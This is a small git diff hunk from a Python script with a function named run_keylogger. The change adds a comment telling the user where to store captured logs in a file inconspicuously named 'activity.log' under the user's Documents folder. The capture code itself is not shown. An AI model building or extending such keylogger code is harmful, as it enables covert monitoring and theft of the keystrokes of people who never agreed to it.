@@ -36,8 +36,8 @@ def run_keylogger():
 
 if __name__ == '__main__':
 
-    documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
-    log_file_path = os.path.join(documents_path, 'activity.log')
+    documents_path = os.path.join(os.path.expanduser('~'), 'Documents') #Change 'Documents' to the path you want to store the logging info. (the path must be under C:\Users\your_user\)
+    log_file_path = os.path.join(documents_path, 'activity.log') 
     
     logging.basicConfig(
         level=logging.DEBUG,
